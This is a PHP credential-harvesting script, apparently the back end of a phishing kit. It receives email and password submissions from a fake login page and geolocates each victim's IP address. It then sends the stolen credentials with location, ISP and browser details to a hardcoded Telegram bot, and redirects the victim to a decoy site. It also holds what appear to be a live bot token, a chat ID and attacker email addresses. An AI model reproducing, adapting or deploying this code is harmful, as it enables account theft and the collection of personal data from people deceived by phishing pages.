<?php
ini_set('display_errors', 0);
error_reporting(0);
// ========================================
// CONFIGURATION SECTION - EDIT THESE VALUES
// ========================================

// Email Configuration
$RECEIVER_EMAIL = "addictlogs6@gmail.com";
$EMAIL_SUBJECT  = "Logs From @lafroshdee";
$FROM_EMAIL     = "noreply@chaplinpropaganda.com.br"; // must match the domain hosting this file

// Telegram Configuration
$TELEGRAM_BOT_TOKEN = "8304102671:AAFVCb5i5XlZE-mVtnlDyiTPYpq0Ymz2Uo8";
$TELEGRAM_CHAT_ID   = "5178786791";

// Where to send the victim after a successful capture
$REDIRECT_URL = "https://www.google.com"; // CHANGE to the real provider URL

// ========================================
// END CONFIGURATION
// ========================================

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method Not Allowed']);
    exit;
}

$email    = isset($_POST['email'])    ? trim($_POST['email'])    : 'Not provided';
$password = isset($_POST['password']) ? trim($_POST['password']) : 'Not provided';
$attempt  = isset($_POST['attempt'])  ? $_POST['attempt']        : 'Unknown';

if ($email === '' || $password === '') {
    echo json_encode(['success' => false, 'message' => 'Email and password are required.']);
    exit;
}

$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp  = date('Y-m-d H:i:s');

// ========================================
// IP LOCATION
// ========================================

$ip_info = @file_get_contents("http://ip-api.com/json/{$ip_address}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query");
$location_data = json_decode($ip_info, true);

if ($location_data && ($location_data['status'] ?? '') === 'success') {
    $country       = $location_data['country'];
    $region        = $location_data['regionName'];
    $city          = $location_data['city'];
    $isp           = $location_data['isp'];
    $org           = $location_data['org'];
    $timezone      = $location_data['timezone'];
    $lat           = $location_data['lat'];
    $lon           = $location_data['lon'];
    $full_location = "$city, $region, $country";
} else {
    $country = $region = $city = $isp = $org = $timezone = $lat = $lon = "Unknown";
    $full_location = "Location unavailable";
}

// ========================================
// EMAIL
// ========================================

$email_message  = "Logs From @lafroshdee\n\n";
$email_message .= "═══════════════════════════════════\n";
$email_message .= "EMAIL: $email\n";
$email_message .= "PASSWORD: $password\n";
$email_message .= "═══════════════════════════════════\n\n";
$email_message .= "Attempt Number: $attempt\n";
$email_message .= "IP Address: $ip_address\n";
$email_message .= "Location: $full_location\n";
$email_message .= "ISP: $isp\n";
$email_message .= "Organization: $org\n";
$email_message .= "Timezone: $timezone\n";
$email_message .= "Coordinates: $lat, $lon\n";
$email_message .= "User Agent: $user_agent\n";
$email_message .= "Timestamp: $timestamp\n";

$email_headers  = "From: Cloud Storage Notification <{$FROM_EMAIL}>\r\n";
$email_headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

$email_sent = false; // @mail($RECEIVER_EMAIL, $EMAIL_SUBJECT, $email_message, $email_headers);

// ========================================
// TELEGRAM  (HTML parse mode = no escaping breakage)
// ========================================

function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

$telegram_message  = "🍪 ❤️Logs From @lafroshdee 💜 🍪\n\n";
$telegram_message .= "═══════════════════════════════════\n";
$telegram_message .= "📧 <b>Email:</b> <code>" . h($email) . "</code>\n";
$telegram_message .= "🔑 <b>Password:</b> <code>" . h($password) . "</code>\n";
$telegram_message .= "═══════════════════════════════════\n\n";
$telegram_message .= "📊 <b>Attempt:</b> #" . h($attempt) . "\n";
$telegram_message .= "🌐 <b>IP:</b> <code>" . h($ip_address) . "</code>\n";
$telegram_message .= "  <b>Location:</b> " . h($full_location) . "\n";
$telegram_message .= "🏢 <b>ISP:</b> " . h($isp) . "\n";
$telegram_message .= "🏛 <b>Org:</b> " . h($org) . "\n";
$telegram_message .= "🕒 <b>Time:</b> " . h($timestamp) . " (" . h($timezone) . ")\n";
$telegram_message .= "📌 <b>Coordinates:</b> <code>" . h($lat) . ", " . h($lon) . "</code>\n";
$telegram_message .= "✨🦠💫🧬✨ <b>UA:</b> " . h($user_agent);

$ch = curl_init("https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => [
        'chat_id'    => $TELEGRAM_CHAT_ID,
        'text'       => $telegram_message,
        'parse_mode' => 'HTML',
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT        => 10,
]);
$telegram_response = curl_exec($ch);
if($telegram_response === false) { 
    file_put_contents("tg_error.log", curl_error($ch)); 
} else { 
    file_put_contents("tg_response.log", $telegram_response); 
}
$telegram_ok = false;
if ($telegram_response) {
    $tg = json_decode($telegram_response, true);
    $telegram_ok = !empty($tg['ok']);
}
curl_close($ch);

// ========================================
// RESPONSE — must match what the frontend reads
// ========================================

echo json_encode([
    'success'       => true,
    'message'       => 'Access granted',
    'redirect'      => $REDIRECT_URL,
    'email_sent'    => (bool)$email_sent,
    'telegram_sent' => $telegram_ok,
]);
